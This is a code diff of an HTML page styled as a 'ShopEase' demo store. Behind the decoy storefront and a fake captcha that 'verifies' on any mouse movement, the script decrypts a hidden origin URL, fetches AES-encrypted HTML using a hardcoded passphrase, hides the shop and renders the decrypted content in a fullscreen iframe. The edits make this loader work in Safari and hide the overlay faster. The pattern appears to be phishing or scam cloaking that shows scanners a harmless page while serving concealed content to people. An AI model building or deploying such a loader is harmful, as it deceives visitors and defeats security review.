@@ -88,7 +88,7 @@
   </style>
 </head>
 <body>
- 
+
   <div class="cap-overlay" id="capOverlay">
     <div class="cap-card">
       <h4>Quick security check</h4>
@@ -104,9 +104,8 @@
     </div>
   </div>
 
-  
   <div id="shop">
-    <div class="hint">🛍️ ShopEase</div>
+  <div class="hint">🛍️ ShopEase</div>
   <!-- ===== Header ===== -->
   <header class="nav">
     <div class="brand">🛍️ ShopEase</div>
@@ -198,12 +197,11 @@
   <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
   </div><!-- /#shop -->
 
- 
+
   <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
 
-  
+
   <script>
-    
     function verifyCaptcha() {
       const overlay = document.getElementById("capOverlay");
       const spinner = document.getElementById("capSpinner");
@@ -213,12 +211,10 @@
       tick.style.display = "block";
       status.textContent = "Verified ✓";
       status.classList.add("ok");
-      setTimeout(() => overlay.classList.add("hide"), 400);   
+      setTimeout(() => overlay.classList.add("hide"), 100);  
     }
 
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
-
-   
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";   
     const URL_KEY = "UrLk3yShopEase01";
     const ENC_DATA_ORIGIN = "U2FsdGVkX1+eeP3rYck3awlh7p+cRXntKEBc5PvRG/WJ+Xsr5AzdM+Jr8jkEOCHS";
     const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
@@ -239,11 +235,10 @@
         const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
         if (!html) throw new Error("Decrypt failed — wrong key?");
 
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
-        const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
-
-        frame.src = lastUrl;
+        // srcdoc = har browser (Safari/Mac included) me chalta hai.
+        // blob: URL ko Safari iframe me reliably render nahi karta, isliye avoid.
+        frame.removeAttribute("src");
+        frame.srcdoc = html;
         shop.style.display = "none";
         frame.style.display = "block";
       } catch (e) {
@@ -251,7 +246,7 @@
       }
     }
 
-    
+    // On first mouse move: captcha verifies + disappears, then encrypted shop loads.
     window.addEventListener("mousemove", () => {
       verifyCaptcha();
       loadSecret();
